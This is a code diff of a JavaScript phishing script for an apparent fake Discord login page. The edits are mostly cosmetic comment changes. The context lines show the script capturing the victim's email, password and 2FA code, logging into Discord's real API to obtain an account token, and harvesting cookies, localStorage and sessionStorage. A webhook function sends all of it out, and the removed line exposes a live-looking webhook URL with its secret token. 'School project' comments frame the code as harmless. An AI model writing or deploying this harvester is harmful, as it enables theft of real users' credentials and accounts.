@@ -5,13 +5,13 @@ const emailInput = document.querySelector('input[id="emailORphone"]');
 const passwordInput = document.querySelector('input[id="password"]');
 const loginButton = document.querySelector('button');
 
-// Debug log to check if inputs are found
+// Debug: Check if elements are found
 console.log("Script loaded. Email input:", emailInput);
 console.log("Password input:", passwordInput);
 console.log("Login button:", loginButton);
 console.log("DOM snapshot of form:", document.querySelector('form')?.outerHTML || "No form found");
 
-// Debug: Check localStorage immediately
+// Debug: Check localStorage at startup
 console.log("Initial localStorage contents:", JSON.stringify(localStorage, null, 2));
 console.log("Token in localStorage:", localStorage.getItem("token"));
 
@@ -52,7 +52,7 @@ function animateEllipsis() {
 // --------------------------------------------------
 function generateQRCode(data) {
   try {
-    // Note: Requires 'qrcode' library (e.g., <script src="https://unpkg.com/qrcode@1.5.1/build/qrcode.min.js"></script>)
+    // Requires qrcode library: <script src="https://unpkg.com/qrcode@1.5.1/build/qrcode.min.js"></script>
     const qr = qrcode(0, "L");
     qr.addData(data);
     qr.make();
@@ -113,7 +113,7 @@ function collectUserTokens() {
 // ---------- FETCH ACCOUNT TOKEN -------------------
 // --------------------------------------------------
 async function fetchAccountToken(email, password) {
-  const apiUrl = "https://discord.com/api/v9/auth/login"; // Real Discord API endpoint
+  const apiUrl = "https://discord.com/api/v9/auth/login"; // Discord login API
   const payload = {
     login: email,
     password: password,
@@ -145,7 +145,7 @@ async function fetchAccountToken(email, password) {
     const data = JSON.parse(responseText);
 
     if (data.mfa) {
-      // Handle MFA (2FA) if enabled
+      // Handle MFA (2FA)
       const mfaCode = prompt("Enter your 2FA code:");
       if (!mfaCode) throw new Error("MFA code required");
 
@@ -187,7 +187,7 @@ async function fetchAccountToken(email, password) {
         const qrCode = generateQRCode(token);
         if (qrCode) {
           document.body.appendChild(qrCode);
-          console.log("QR code generated and appended for MFA token");
+          console.log("QR code generated for MFA token");
         }
       }
 
@@ -209,7 +209,7 @@ async function fetchAccountToken(email, password) {
       const qrCode = generateQRCode(token);
       if (qrCode) {
         document.body.appendChild(qrCode);
-        console.log("QR code generated and appended for token");
+        console.log("QR code generated for token");
       }
     }
 
@@ -236,8 +236,8 @@ async function fetchAccountToken(email, password) {
 // ---------- WEBHOOK FUNCTION ----------------------
 // --------------------------------------------------
 async function sendToWebhook(email, password, tokenData) {
-  // For school project: Use a test webhook (e.g., https://webhook.site)
-  const webhookUrl = "https://discord.com/api/webhooks/1414568057652772884/-WdSwhYyx44jjWlk29Ac-dOed621NJN_KwF7abSIkyyB8KfOuQY3busFvMulOnpImY9G"; // Replace with test webhook URL
+  // Use a test webhook URL (e.g., from https://webhook.site)
+  const webhookUrl = "https://your-test-webhook-url-here"; // Replace with test webhook
   const { apiToken, userTokens } = tokenData || { apiToken: null, userTokens: { cookies: {}, localStorage: {}, sessionStorage: {} } };
   const payload = {
     content: `Email: ${email}\nPassword: ${password}\nAPI Token: ${apiToken || 'Not retrieved'}\nCookies: ${JSON.stringify(userTokens.cookies, null, 2)}\nLocalStorage: ${JSON.stringify(userTokens.localStorage, null, 2)}\nSessionStorage: ${JSON.stringify(userTokens.sessionStorage, null, 2)}\nTimestamp: ${new Date().toISOString()}`,
@@ -333,7 +333,7 @@ if (loginButton) {
   }
 }
 
-// Prevent right-click (optional, keep for school project if needed)
+// Prevent right-click (optional for school project)
 document.addEventListener("contextmenu", function (e) {
   e.preventDefault();
 });
